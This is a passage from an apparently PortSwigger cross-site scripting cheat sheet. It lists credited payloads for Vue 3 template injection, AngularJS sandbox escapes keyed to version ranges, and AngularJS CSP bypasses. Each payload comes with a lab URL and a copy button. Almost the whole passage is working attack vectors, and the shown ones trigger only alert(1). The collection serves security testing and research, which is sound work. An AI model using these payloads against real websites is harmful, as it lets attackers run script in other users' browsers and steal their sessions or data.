clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected42)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n52\n\n[``<x @click=_withCtx.constructor`alert(1)`()>click</x>``](https://portswigger-labs.net/xss/vue3.php?x=%3Cx%20%40click%3D_withCtx.constructor%60alert%281%29%60%28%29%3Eclick%3C%2Fx%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected43)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n40\n\n[`<x @click=$event.view.alert(1)>click</x>`](https://portswigger-labs.net/xss/vue3.php?x=%3Cx%20%40click%3D%24event.view.alert%281%29%3Eclick%3C%2Fx%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected44)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n34\n\n[``{{_Vue.h.constructor`alert(1)`()}}``](https://portswigger-labs.net/xss/vue3.php?x=%7B%7B_Vue.h.constructor%60alert%281%29%60%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected45)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n33\n\n[``{{$emit.constructor`alert(1)`()}}``](https://portswigger-labs.net/xss/vue3.php?x=%7B%7B%24emit.constructor%60alert%281%29%60%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected46)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n85\n\n[`<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>`](https://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to%3Dscript%3Anth-child%282%29%3Ealert%26lpar%3B1%26rpar%3B%3C%2Fteleport%3E%3C%2Fdiv%3E%3Cscript%3E%3C%2Fscript%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected47)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n85\n\n[`<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>`](https://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to%3Dscript%3Anth-child%282%29%3Ealert%26lpar%3B1%26rpar%3B%3C%2Fteleport%3E%3C%2Fdiv%3E%3Cscript%3E%3C%2Fscript%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected48)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n35\n\n[`<component is=script text=alert(1)>`](https://portswigger-labs.net/xss/vue3.php?x=%3Ccomponent%20is%3Dscript%20text%3Dalert%281%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected49)\n\n### AngularJS sandbox escapes reflected\n\nVersion:\n\nAuthor:\n\nLength:\n\nVector:\n\nCopy:\n\n1.0.1 - 1.1.5\n\n[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)\n\n41\n\n[`{{constructor.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.0.1&x=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5)\n\n1.0.1 - 1.1.5 (shorter)\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) (Synopsys)\n\n33\n\n[`{{$on.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.0.1&x=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5-\\(shorter\\))\n\n1.2.0 - 1.2.1\n\n[Jann Horn](https://twitter.com/tehjh) (Google)\n\n122\n\n[`{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.2.0&x=%7B%7Ba%3D%27constructor%27%3Bb%3D%7B%7D%3Ba.sub.call.call%28b%5Ba%5D.getOwnPropertyDescriptor%28b%5Ba%5D.getPrototypeOf%28a.sub%29%2Ca%29.value%2C0%2C%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.2.0---1.2.1)\n\n1.2.2 - 1.2.5\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n23\n\n[`{{{}.\")));alert(1)//\"}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.2.2&x=%7B%7B%7B%7D.%22%29%29%29%3Balert%281%29%2F%2F%22%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.2.2---1.2.5)\n\n1.2.6 - 1.2.18\n\n[Jan Horn](https://twitter.com/tehjh) (Google)\n\n106\n\n[`{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.2.6&x=%7B%7B%28_%3D%27%27.sub%29.call.call%28%7B%7D%5B%24%3D%27constructor%27%5D.getOwnPropertyDescriptor%28_.__proto__%2C%24%29.value%2C0%2C%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.2.6---1.2.18)\n\n1.2.19 - 1.2.23\n\n[Mathias Karlsson](https://twitter.com/avlidienbrunn) (Detectify)\n\n124\n\n[`{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.2.19&x=%7B%7BtoString.constructor.prototype.toString%3DtoString.constructor.prototype.call%3B%5B%22a%22%2C%22alert%281%29%22%5D.sort%28toString.constructor%29%3B%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.2.19---1.2.23)\n\n1.2.24 - 1.2.29\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n23\n\n[`{{{}.\")));alert(1)//\"}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.2.24&x=%7B%7B%7B%7D.%22%29%29%29%3Balert%281%29%2F%2F%22%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.2.24---1.2.29)\n\n1.2.27-1.2.29/1.3.0-1.3.20\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n23\n\n[`{{{}.\")));alert(1)//\"}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.2.27&x=%7B%7B%7B%7D.%22%29%29%29%3Balert%281%29%2F%2F%22%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.2.27-1.2.29/1.3.0-1.3.20)\n\n1.3.0\n\n[G\u00e1bor Moln\u00e1r](https://twitter.com/molnar_g) (Google)\n\n272\n\n[``` {{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )));}} ```](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.3.0&x=%7B%7B%21ready%20%26%26%20%28ready%20%3D%20true%29%20%26%26%20%28%0A%21call%0A%3F%20%24%24watchers%5B0%5D.get%28toString.constructor.prototype%29%0A%3A%20%28a%20%3D%20apply%29%20%26%26%0A%28apply%20%3D%20constructor%29%20%26%26%0A%28valueOf%20%3D%20call%29%20%26%26%0A%28%27%27%2B%27%27.toString%28%0A%27F%20%3D%20Function.prototype%3B%27%20%2B%0A%27F.apply%20%3D%20F.a%3B%27%20%2B%0A%27delete%20F.a%3B%27%20%2B%0A%27delete%20F.valueOf%3B%27%20%2B%0A%27alert%281%29%3B%27%0A%29%29%29%3B%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.3.0)\n\n1.3.3 - 1.3.18\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n128\n\n[`{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.3.3&x=%7B%7B%7B%7D%5B%7BtoString%3A%5B%5D.join%2Clength%3A1%2C0%3A%27__proto__%27%7D%5D.assign%3D%5B%5D.join%3B%27a%27.constructor.prototype.charAt%3D%5B%5D.join%3B%24eval%28%27x%3Dalert%281%29%2F%2F%27%29%3B%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.3.3---1.3.18)\n\n1.3.19\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n102\n\n[`{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.3.19&x=%7B%7B%27a%27%5B%7BtoString%3Afalse%2CvalueOf%3A%5B%5D.join%2Clength%3A1%2C0%3A%27__proto__%27%7D%5D.charAt%3D%5B%5D.join%3B%24eval%28%27x%3Dalert%281%29%2F%2F%27%29%3B%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.3.19)\n\n1.3.20\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n65\n\n[`{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.3.20&x=%7B%7B%27a%27.constructor.prototype.charAt%3D%5B%5D.join%3B%24eval%28%27x%3Dalert%281%29%27%29%3B%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.3.20)\n\n1.4.0 - 1.4.9\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n74\n\n[`{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.4.0&x=%7B%7B%27a%27.constructor.prototype.charAt%3D%5B%5D.join%3B%24eval%28%27x%3D1%7D%20%7D%20%7D%3Balert%281%29%2F%2F%27%29%3B%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.4.0---1.4.9)\n\n1.5.0 - 1.5.8\n\n[Ian Hickey](https://twitter.com/ianhickey1024) & [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n79\n\n[`{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.5.0&x=%7B%7Bx%3D%7B%27y%27%3A%27%27.constructor.prototype%7D%3Bx%5B%27y%27%5D.charAt%3D%5B%5D.join%3B%24eval%28%27x%3Dalert%281%29%27%29%3B%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.5.0---1.5.8)\n\n1.5.9 - 1.5.11\n\n[Jann Horn](https://twitter.com/tehjh) (Google)\n\n517\n\n[``` {{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(\" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument={type:'Identifier',name:'foo'}; \"); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }} ```](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.5.9&x=%7B%7B%0Ac%3D%27%27.sub.call%3Bb%3D%27%27.sub.bind%3Ba%3D%27%27.sub.apply%3B%0Ac.%24apply%3D%24apply%3Bc.%24eval%3Db%3Bop%3D%24root.%24%24phase%3B%0A%24root.%24%24phase%3Dnull%3Bod%3D%24root.%24digest%3B%24root.%24digest%3D%28%7B%7D%29.toString%3B%0AC%3Dc.%24apply%28c%29%3B%24root.%24%24phase%3Dop%3B%24root.%24digest%3Dod%3B%0AB%3DC%28b%2Cc%2Cb%29%3B%24evalAsync%28%22%0AastNode%3Dpop%28%29%3BastNode.type%3D%27UnaryExpression%27%3B%0AastNode.operator%3D%27%28window.X%3Fvoid0%3A%28window.X%3Dtrue%2Calert%281%29%29%29%2B%27%3B%0AastNode.argument%3D%7Btype%3A%27Identifier%27%2Cname%3A%27foo%27%7D%3B%0A%22%29%3B%0Am1%3DB%28%24%24asyncQueue.pop%28%29.expression%2Cnull%2C%24root%29%3B%0Am2%3DB%28C%2Cnull%2Cm1%29%3B%5B%5D.push.apply%3Dm2%3Ba%3D%27%27.sub%3B%0A%24eval%28%27a%28b.c%29%27%29%3B%5B%5D.push.apply%3Da%3B%0A%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.5.9---1.5.11)\n\n1.5.9 - 1.5.11 shorter\n\n[Jann Horn](https://twitter.com/tehjh) (Google) & Lukasz Plonka\n\n326\n\n[`{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};\");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.5.9&x=%7B%7Bc%3D%27%27.sub.call%3Bb%3D%27%27.sub.bind%3Bc.%24apply%3D%24apply%3Bc.%24eval%3Db%3B%24root.%24%24phase%3Dnull%3B%24root.%24digest%3D%24on%3B%20C%3Dc.%24apply%28c%29%3BB%3DC%28b%2Cc%2Cb%29%3B%24evalAsync%28%22astNode%3Dpop%28%29%3BastNode.type%3D%27UnaryExpression%27%3BastNode.operator%3D%27alert%281%29%27%3BastNode.argument%3D%7Btype%3A%27Identifier%27%7D%3B%22%29%3Bm1%3D%24%24asyncQueue.pop%28%29.expression%3Bm2%3DB%28C%2Cnull%2Cm1%29%3B%5B%5D.push.apply%3Dm2%3B%24eval%28%27B%28b%29%27%29%3B%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.5.9---1.5.11-shorter)\n\n\\>\\=1.6.0\n\n[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)\n\n41\n\n[`{{constructor.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.6.0&x=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--%3E=1.6.0)\n\n\\>\\=1.6.0 (shorter)\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) (Synopsys)\n\n33\n\n[`{{$on.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.6.0&x=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--%3E=1.6.0-\\(shorter\\))\n\n### DOM based AngularJS sandbox escapes\n\n(Using orderBy or no $eval)\n\nVersion:\n\nAuthor:\n\nLength:\n\nVector:\n\nCopy:\n\n1.0.1 - 1.1.5\n\n[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)\n\n37\n\n[`constructor.constructor('alert(1)')()`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.0.1&x=constructor.constructor%28%27alert%281%29%27%29%28%29)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.0.1---1.1.5)\n\n1.2.0 - 1.2.18\n\n[Jann Horn](https://twitter.com/tehjh) (Google)\n\n118\n\n[`a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.2.0&x=a%3D%27constructor%27%3Bb%3D%7B%7D%3Ba.sub.call.call%28b%5Ba%5D.getOwnPropertyDescriptor%28b%5Ba%5D.getPrototypeOf%28a.sub%29%2Ca%29.value%2C0%2C%27alert%281%29%27%29%28%29)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.2.0---1.2.18)\n\n1.2.19 - 1.2.23\n\n[Mathias Karlsson](https://twitter.com/avlidienbrunn) (Detectify)\n\n119\n\n[`toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.2.19&x=toString.constructor.prototype.toString%3DtoString.constructor.prototype.call%3B%5B%22a%22%2C%22alert%281%29%22%5D.sort%28toString.constructor%29)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.2.19---1.2.23)\n\n1.2.24 - 1.2.26\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n317\n\n[`{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.2.24&x=%7B%7D%5B%5B%27__proto__%27%5D%5D%5B%27x%27%5D%3Dconstructor.getOwnPropertyDescriptor%3Bg%3D%7B%7D%5B%5B%27__proto__%27%5D%5D%5B%27x%27%5D%3B%7B%7D%5B%5B%27__proto__%27%5D%5D%5B%27y%27%5D%3Dg%28%27%27.sub%5B%5B%27__proto__%27%5D%5D%2C%27constructor%27%29%3B%7B%7D%5B%5B%27__proto__%27%5D%5D%5B%27z%27%5D%3Dconstructor.defineProperty%3Bd%3D%7B%7D%5B%5B%27__proto__%27%5D%5D%5B%27z%27%5D%3Bd%28%27%27.sub%5B%5B%27__proto__%27%5D%5D%2C%27constructor%27%2C%7Bvalue%3Afalse%7D%29%3B%7B%7D%5B%5B%27__proto__%27%5D%5D%5B%27y%27%5D.value%28%27alert%281%29%27%29%28%29)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.2.24---1.2.26)\n\n1.2.27-1.2.29/1.3.0-1.3.20\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n20\n\n[`{}.\")));alert(1)//\";`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.2.27&x=%7B%7D.%22%29%29%29%3Balert%281%29%2F%2F%22%3B)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.2.27-1.2.29/1.3.0-1.3.20)\n\n1.4.0-1.4.5\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n75\n\n[`'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.4.0&x=%27a%27.constructor.prototype.charAt%3D%5B%5D.join%3B%5B1%5D%7CorderBy%3A%27x%3D1%7D%20%7D%20%7D%3Balert%281%29%2F%2F%27%3B)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.0-1.4.5)\n\n1.4.2-1.5.8\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Daniel Kachakil](https://twitter.com/kachakil) (Anvil Ventures)\n\n70\n\n[`{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.5.0&x=%7By%3A%27%27.constructor.prototype%7D.y.charAt%3D%5B%5D.join%3B%5B1%5D%7CorderBy%3A%27x%3Dalert%281%29%27)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.2-1.5.8)\n\n\\>\\=1.6.0\n\n[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)\n\n37\n\n[`constructor.constructor('alert(1)')()`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.6.0&x=constructor.constructor%28%27alert%281%29%27%29%28%29)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--%3E=1.6.0)\n\n1.4.4 (without strings)\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n134\n\n[`toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`](https://portswigger-labs.net/xss/angularjs.php?type=dom&csp=0&version=1.4.4&x=toString%28%29.constructor.prototype.charAt%3D%5B%5D.join%3B%20%5B1%2C2%5D%7CorderBy%3AtoString%28%29.constructor.fromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-\\(without-strings\\))\n\n### AngularJS CSP bypasses\n\nVersion:\n\nAuthor:\n\nLength:\n\nVector:\n\nCopy:\n\nAll versions (all browsers) using from\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n91\n\n[`<input autofocus ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'\">`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=1&version=1.4.5&x=%3Cinput%20autofocus%20ng-focus%3D%22%24event.composedPath%28%29%7CorderBy%3A%27%5B%5D.constructor.from%28%5B1%5D%2Calert%29%27%22%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-\\(all-browsers\\)-using-from)\n\nAll versions (all browsers) shorter using assignment\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n66\n\n[`<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=1&version=1.4.5&x=%3Cinput%20id%3Dx%20ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28z%3Dalert%29%281%29%27%3E#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-\\(all-browsers\\)-shorter-using-assignment)\n\nAll versions (all browsers) shorter\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n91\n\n[`<input autofocus ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'\">`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=1&version=1.4.5&x=%3Cinput%20autofocus%20ng-focus%3D%22%24event.composedPath%28%29%7CorderBy%3A%27%5B%5D.constructor.from%28%5B1%5D%2Calert%29%27%22%3E#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-\\(all-browsers\\)-shorter)\n\n1.2.0 - 1.5.0\n\n[Eduardo Vela](https://twitter.com/sirdarckcat) (Google)\n\n190\n\n[`<div ng-app ng-csp><div ng-focus=\"x=$event;\" id=f tabindex=0>foo</div><div ng-repeat=\"(key, value) in 